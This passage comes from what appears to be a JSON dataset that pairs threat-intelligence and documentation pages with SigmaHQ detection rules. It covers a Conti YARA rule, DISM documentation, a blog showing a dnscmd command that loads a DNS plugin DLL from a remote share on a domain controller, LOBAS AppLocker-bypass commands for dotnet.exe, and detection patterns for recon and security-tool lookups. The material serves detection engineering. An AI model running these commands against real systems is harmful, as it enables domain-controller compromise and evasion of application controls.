\"https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\"\n      date = \"2022-04-04\"\n      hash1 = \"8fb035b73bf207243c9b29d96e435ce11eb9810a0f4fdcc6bb25a14a0ec8cc21\"\n   strings:\n      $s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n      $s2 = \"conti_v3.dll\" fullword ascii\n      $s3 = \"        <requestedExecutionLevel level='asInvoker' uiAccess='false' />\" fullword ascii\n      $s4 = \"api-ms-win-core-processthreads-l1-1-2\" fullword wide\n      $s5 = \"ext-ms-win-ntuser-dialogbox-l1-1-0\" fullword wide\n      $s6 = \" Type Descriptor'\" fullword ascii\n      $s7 = \"operator \\\"\\\" \" fullword ascii\n      $s8 = \"operator co_await\" fullword ascii\n      $s9 = \"  <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii\n      $s10 = \"api-ms-win-rtcore-ntuser-window-l1-1-0\" fullword wide\n      $s11 = \"api-ms-win-security-systemfunctions-l1-1-0\" fullword wide\n      $s12 = \"ext-ms-win-ntuser-windowstation-l1-1-0\" fullword wide\n      $s13 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n      $s14 = \" Base Class Descriptor at (\" fullword ascii\n      $s15 = \" Class Hierarchy Descriptor'\" fullword ascii\n      $s16 = \"bad array new length\" fullword ascii\n      $s17 = \" Complete Object Locator'\" fullword ascii\n      $s18 = \".data$r\" fullword ascii\n      $s19 = \" delete[]\" fullword ascii\n      $s20 = \"  </trustInfo>\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 700KB and\n      all of them\n}\n```\n\n### MITRE\n\n```\nT1614.001 - System Location Discovery: System Language Discovery\nT1218.010 - Signed Binary Proxy Execution: Regsvr32\nT1218.011 - Signed Binary Proxy Execution: Rundll32\nT1059.001 - Command and Scripting Interpreter: PowerShell\nT1055 - Process Injection\nT1003.001 - OS Credential Dumping: LSASS Memory\nT1486 - Data Encrypted for Impact\nT1482 - Domain Trust Discovery\nT1021.002 - Remote Services: SMB/Windows Admin Shares\nT1219 - Remote Access Software\nT1083 - File and Directory Discovery\nT1562.001 - Impair Defenses: Disable or Modify Tools\nT1518.001 - Software Discovery: Security Software Discovery\nT1047 - Windows Management Instrumentation\nT1087.002 - Account Discovery: Domain Account\nT1068 - Exploitation for Privilege Escalation\nT1082 - System Information Discovery\nT1018 - Remote System Discovery\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1569.002 - Service Execution\nT1071.001 Web Protocols\n\nS0552 - AdFind\nS0154 - Cobalt Strike\nS0097 - Ping\n```",
    "sigma_rule": {
      "title": "Suspicious High IntegrityLevel Conhost Legacy Option",
      "id": "3037d961-21e9-4732-b27a-637bcc7bf539",
      "status": "test",
      "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "references": [
        "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
      ],
      "author": "frack113",
      "date": "2022-12-09",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "IntegrityLevel": [
            "High",
            "S-1-16-12288"
          ],
          "CommandLine|contains|all": [
            "conhost.exe",
            "0xffffffff",
            "-ForceV1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very Likely, including launching cmd.exe via Run As Administrator"
      ],
      "level": "informational"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_legacy_option.yml",
    "id": "115"
  },
  {
    "url": "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
    "markdown": "# Enable-WindowsOptionalFeature\n\n## Syntax\n\n```\nEnable-WindowsOptionalFeature\n -FeatureName <String[]>\n  [-PackageName <String>]\n  [-All]\n  [-LimitAccess]\n  [-Source <String[]>]\n  [-NoRestart]\n  [-Online]\n  [-WindowsDirectory <String>]\n  [-SystemDrive <String>]\n  [-LogPath <String>]\n  [-ScratchDirectory <String>]\n  [-LogLevel <LogLevel>]\n  [<CommonParameters>]\n```\n\n```\nEnable-WindowsOptionalFeature\n -FeatureName <String[]>\n  [-PackageName <String>]\n  [-All]\n  [-LimitAccess]\n  [-Source <String[]>]\n  [-NoRestart]\n -Path <String>\n  [-WindowsDirectory <String>]\n  [-SystemDrive <String>]\n  [-LogPath <String>]\n  [-ScratchDirectory <String>]\n  [-LogLevel <LogLevel>]\n  [<CommonParameters>]\n```\n\n## Description\n\nThe **Enable-WindowsOptionalFeature** cmdlet enables or restores an optional feature in a Windows image.\n\nUse the *Online* parameter to specify the running operating system on your local computer, or use the *Path* parameter to specify the location of a mounted Windows image.\n\nThe *PackageName* parameter specifies the package that the feature is a component of. This parameter is optional when the package is the Windows Foundation package.\n\nThe *FeatureName* parameter specifies the feature to add. You can specify more than one feature in the same package. Separate feature names with a comma.\n\nThe *Source* parameter specifies the location of files that are needed to restore a removed feature.\n\nThe *LimitAccess* parameter prevents access to Windows Update as a *Source* for restoring features to online images. The *All* parameter enables all parent features of the specified feature before enabling the specified feature. The parent feature will be enabled with default values.\n\n## Examples\n\n### Example 1: Enable an optional feature in the running operating system\n\n```\nPS C:\\> Enable-WindowsOptionalFeature -Online -FeatureName \"Hearts\" -All\n```\n\nThis command enables the optional feature, Hearts, the parent feature for Hearts, and the dependencies for the parent feature in the running Windows operating system.\n\n### Example 2: Enable an optional feature in a mounted operating system image\n\n```\nPS C:\\> Enable-WindowsOptionalFeature -Path \"c:\\offline\" -FeatureName \"Calc\" -PackageName \"Microsoft.Windows.Calc.Demo~6595b6144ccf1df~x86~en~1.0.0.0\"\n```\n\nThis command enables the optional feature, Calc, in the specified package in the Windows image that is mounted to c:\\offline.\n\n### Example 3: Restore an optional feature\n\n```\nPS C:\\> Enable-WindowsOptionalFeature -Online -FeatureName \"MyFeature\" -Source \"c:\\test\\mount\" -LimitAccess\n```\n\nThis command restores the optional feature, MyFeature, to the Windows image that is mounted to c:\\offline using source files from another Windows image that is mounted to c:\\test\\mount. If the files are not found in the source image, this command specifies not to check Windows Update for the source files.\n\n## Parameters\n\n### -All\n\nEnables all parent features of the specified feature. If a parent feature is required for the specified feature to be enabled in the image, *All* will enable the parent and all of its default dependencies.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| SwitchParameter | Named | None | False | True | False |\n\n### -FeatureName\n\nSpecifies the name of the feature to be enabled. Feature names are case sensitive if you are servicing a Windows image running a version of Windows earlier than Windows® 8. You can use `Get-WindowsOptionalFeature` to find the name of the feature in the image.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String[] | Named | None | True | True | False |\n\n### -LimitAccess\n\nPrevents DISM from contacting Windows Update when searching for the source files to restore a feature on an online image.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| SwitchParameter | Named | None | False | True | False |\n\n### -LogLevel\n\nSpecifies the maximum output level shown in the logs. The default log level is 3. The accepted values are as follows:\n\n- 1 = Errors only\n- 2 = Errors and warnings\n- 3 = Errors, warnings, and information\n- 4 = All of the information listed previously, plus debug output\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| LogLevel | Named | None | False | True | False |\n\n### -LogPath\n\nSpecifies the full path and file name to log to. If not set, the default is `%WINDIR%\\Logs\\Dism\\dism.log`.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | False | True | False |\n\n### -NoRestart\n\nSuppresses reboot. If a reboot is not required, this command does nothing. This option will keep the application from prompting for a restart or keep it from restarting automatically.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| SwitchParameter | Named | None | False | True | False |\n\n### -Online\n\nSpecifies that the action is to be taken on the operating system that is currently running on the local computer.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| SwitchParameter | Named | None | True | True | False |\n\n### -PackageName\n\nSpecifies the name of a package in the Windows image.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | False | True | False |\n\n### -Path\n\nSpecifies the full path to the root directory of the offline Windows image that you will service.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | True | True | False |\n\n### -ScratchDirectory\n\nSpecifies a temporary directory that will be used when extracting files for use during servicing. The directory must exist locally.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | False | True | False |\n\n### -Source\n\nSpecifies the location of the files that are required to restore a feature that has been removed from the image.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String[] | Named | None | False | True | False |\n\n### -SystemDrive\n\nSpecifies the path to the location of the BootMgr files.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | False | True | False |\n\n### -WindowsDirectory\n\nSpecifies the path to the Windows directory relative to the image path.\n\n| Type | Position | Default value | Required | Accept pipeline input | Accept wildcard characters |\n|------|----------|---------------|----------|-----------------------|----------------------------|\n| String | Named | None | False | True | False |\n\n## Inputs\n\n- [String[]](https://learn.microsoft.com/en-us/dotnet/api/system.string)\n- Microsoft.Dism.Commands.ImageObject\n- Microsoft.Dism.Commands.BasicFeatureObject\n- Microsoft.Dism.Commands.AdvancedFeatureObject\n\n## Outputs\n\n- Microsoft.Dism.Commands.ImageObject\n\n## Related Links\n\n- Disable-WindowsOptionalFeature\n- Get-WindowsOptionalFeature\n- Add-WindowsPackage",
    "sigma_rule": {
      "title": "PowerShell Web Access Feature Enabled Via DISM",
      "id": "7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f",
      "status": "test",
      "description": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse",
      "references": [
        "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a",
        "https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41"
      ],
      "author": "Michael Haag",
      "date": "2024-09-03",
      "tags": [
        "attack.persistence",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dism.exe"
          },
          {
            "OriginalFileName": "DISM.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "WindowsPowerShellWebAccess",
            "/online",
            "/enable-feature"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate PowerShell Web Access installations by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_enable_powershell_web_access_feature.yml",
    "id": "139"
  },
  {
    "url": "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html",
    "markdown": "# Hunting DNS Server Level Plugin dll injection\n\n09 May 2017\n\nThis post is accompanying my addition to the ThreatHunter-Playbook to enhance the IOC I added there with some details to detect the DNS server level plugin dll injection, published this week. I am not going to make a detailed description for that attack, as there are already plenty of great resources:\n\n- Feature, not bug: DNSAdmin to DC compromise in one line.\n- Abusing DNSAdmins privilege for escalation in Active Directory\n\nIf you want to play with this DNS server feature just use one of the following DNS Server ready-to-use DNS server level plugin dlls:\n\n- VCC project on my GitHub\n- mimilib is also ready\n\nWe assume the attacker has a privileged user to reconfigure the DNS service:\n\nThe attack has to be executed in two steps:\n\n1.\n   ```\n   dnscmd.exe dc1.lab.internal /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll\n   ```\n   - Whereas the dll has to be as a special DNS server plugin dll. (my GitHub)\n   - A registry parameter gets added: `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll` and set to the value `\\\\192.168.0.149\\dll\\wtf.dll`\n\n2. The DNS service gets restarted\n   - The DLL is loaded into `dns.exe` and the API functions are called.\n\n## Additional DLLs loaded\n\nIf a DNS server plugin gets added to the DNS there are two dlls loaded additionally to the default ones and the specified plugin dll, which may be required especially when the plugin dll is located on a network share.\n\n- `C:\\Windows\\System32\\icmp.dll`\n- `C:\\Windows\\System32\\oleaut32.dll`\n- `\\\\192.168.0.149\\dll\\wtf.dll` (the specified plugin dll)\n\nYou can download the raw data of the intersection (2 at the last column means loaded in both cases plugin / no plugin) here.\n\n## events triggered: executing dnscmd\n\n-\n   ```\n   dnscmd dc1 /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll\n   ```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n    <EventID>13</EventID>\n    <Version>2</Version>\n    <Level>4</Level>\n    <Task>13</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000000000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:52:35.589834200Z\"/>\n    <EventRecordID>8435</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"1264\" ThreadID=\"2980\"/>\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"EventType\">SetValue</Data>\n    <Data Name=\"UtcTime\">2017-05-09 08:52:35.589</Data>\n    <Data Name=\"ProcessGuid\">{85D1CFA0-7DCD-5911-0000-0010F4196600}</Data>\n    <Data Name=\"ProcessId\">3388</Data>\n    <Data Name=\"Image\">C:\\Windows\\system32\\dns.exe</Data>\n    <Data Name=\"TargetObject\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\DNS\\Parameters\\ServerLevelPluginDll</Data>\n    <Data Name=\"Details\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n  </EventData>\n</Event>\n```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNSServer\" Guid=\"{EB79061A-A566-4698-9119-3ED2807060E7}\"/>\n    <EventID>541</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>10</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x4000000008000000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:52:35.589834200Z\"/>\n    <EventRecordID>148</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"3388\" ThreadID=\"3928\"/>\n    <Channel>Microsoft-Windows-DNSServer/Audit</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-21-764058423-2567595003-319586131-1001\"/>\n  </System>\n  <EventData>\n    <Data Name=\"Setting\">serverlevelplugindll</Data>\n    <Data Name=\"Scope\">.</Data>\n    <Data Name=\"NewValue\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n  </EventData>\n</Event>\n```\n\n## events triggered: DNS service Restarted\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>771</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:54:26.798142300Z\"/>\n    <EventRecordID>263</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"2312\" ThreadID=\"3068\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData/>\n</Event>\n```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>770</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:54:26.798142300Z\"/>\n    <EventRecordID>264</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"2312\" ThreadID=\"3068\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"DNS_EVENT_PLUGIN_DLL_LOAD_OK\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n    <Data Name=\"param2\">dc1.lab.internal</Data>\n  </EventData>\n</Event>\n```\n\n## events triggered: on error\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>150</EventID>\n    <Version>0</Version>\n    <Level>2</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:00:55.264092600Z\"/>\n    <EventRecordID>219</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"3904\" ThreadID=\"2324\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"DNS_EVENT_PLUGIN_INIT_FAILED\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n    <Binary>7F000000</Binary>\n  </EventData>\n</Event>\n```\n\n---\n\nTags:\n- #Threat Hunting\n- #sysmon\n- #DNS\n- #Windows\n- #Microsoft",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE",
      "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dnscmd.exe",
          "CommandLine|contains|all": [
            "/config",
            "/serverlevelplugindll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml",
    "id": "149"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
    "markdown": "# /Dotnet.exe\n\ndotnet.exe comes with .NET Framework\n\n### Paths:\n- `C:\\Program Files\\dotnet\\dotnet.exe`\n\n### Resources:\n- https://twitter.com/_felamos/status/1204705548668555264\n- https://gist.github.com/bohops/3f645a7238d8022830ecf5511b3ecfbc\n- https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\n- https://learn.microsoft.com/en-us/dotnet/fsharp/tools/fsharp-interactive/\n\n### Detections:\n- **Sigma**: proc_creation_win_lolbin_dotnet.yml\n- **BlockRule**: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n- **IOC**: dotnet.exe spawned an unknown process\n\n## AWL bypass\n\n1. dotnet.exe will execute any dll even if applocker is enabled.\n   ```\n   dotnet.exe [PATH_TO_DLL]\n   ```\n   **Properties**:\n   - **Use case**: Execute code bypassing AWL\n   - **Privileges required**: User\n   - **Operating systems**: Windows 7 and up with .NET installed\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution\n\n2. dotnet.exe with msbuild (SDK Version) will execute unsigned code\n   ```\n   dotnet.exe msbuild [Path_TO_XML_CSPROJ]\n   ```\n   **Properties**:\n   - **Use case**: Execute code bypassing AWL\n   - **Privileges required**: User\n   - **Operating systems**: Windows 10 and up with .NET Core installed\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution\n\n## Execute\n\n1. dotnet.exe will execute any DLL.\n   ```\n   dotnet.exe [PATH_TO_DLL]\n   ```\n   **Properties**:\n   - **Use case**: Execute DLL\n   - **Privileges required**: User\n   - **Operating systems**: Windows 7 and up with .NET installed\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution\n\n2. dotnet.exe will open a console which allows for the execution of arbitrary F# commands\n   ```\n   dotnet.exe fsi\n   ```\n   **Properties**:\n   - **Use case**: Execute arbitrary F# code\n   - **Privileges required**: User\n   - **Operating systems**: Windows 10 and up with .NET SDK installed\n   - **ATT&CK® technique**: T1059: Command and Scripting Interpreter",
    "sigma_rule": {
      "title": "Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE",
      "id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
      "status": "test",
      "description": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
        "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
        "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/"
      ],
      "author": "Beyu Denis, oscd.community",
      "date": "2020-10-18",
      "modified": "2024-04-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dotnet.exe"
          },
          {
            "OriginalFileName": ".NET Host"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".csproj",
            ".csproj\"",
            ".dll",
            ".dll\"",
            ".csproj'",
            ".dll'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administrator usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml",
    "id": "150"
  },
  {
    "url": "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
    "markdown": "# Post\n\nDec 11, 2019\n\ndotnet.exe [PATH_TO_DLL]\n\nIts just like doing python http://script.py . (funny)\n\ndotnet.exe is trusted binary and Default AppLocker rule don't block it so its a valid AppLocker bypass. Similar to regasm.exe.\n\nCC @egre55  #lolbin",
    "sigma_rule": {
      "title": "Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE",
      "id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
      "status": "test",
      "description": "Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/",
        "https://web.archive.org/web/20210525212021/https://twitter.com/_felamos/status/1204705548668555264",
        "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/"
      ],
      "author": "Beyu Denis, oscd.community",
      "date": "2020-10-18",
      "modified": "2024-04-24",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dotnet.exe"
          },
          {
            "OriginalFileName": ".NET Host"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".csproj",
            ".csproj\"",
            ".dll",
            ".dll\"",
            ".csproj'",
            ".dll'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administrator usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml",
    "id": "151"
  },
  {
    "url": "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Recon Command Output Piped To Findstr.EXE",
      "id": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
        "https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-07-06",
      "modified": "2024-06-27",
      "tags": [
        "attack.discovery",
        "attack.t1057"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "ipconfig*|*find",
            "net*|*find",
            "netstat*|*find",
            "ping*|*find",
            "systeminfo*|*find",
            "tasklist*|*find",
            "whoami*|*find"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_recon_pipe_output.yml",
    "id": "170"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml",
    "id": "173"
  },
  {
    "url": "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
